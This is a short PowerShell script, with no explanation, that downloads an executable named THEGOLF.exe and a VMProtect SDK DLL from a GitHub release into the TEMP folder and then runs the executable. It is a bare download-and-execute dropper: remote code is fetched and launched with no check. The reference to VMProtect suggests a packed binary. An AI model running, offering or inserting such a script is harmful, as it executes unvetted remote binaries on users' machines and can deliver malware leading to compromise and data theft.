$baseUrl = "https://github.com/kosnaja12/cal/releases/download/tata"

iwr "$baseUrl/THEGOLF.exe" -OutFile "$env:TEMP\THEGOLF.exe" -UseBasicParsing
iwr "$baseUrl/VMProtectSDK64.dll" -OutFile "$env:TEMP\VMProtectSDK64.dll" -UseBasicParsing

Start-Process "$env:TEMP\THEGOLF.exe"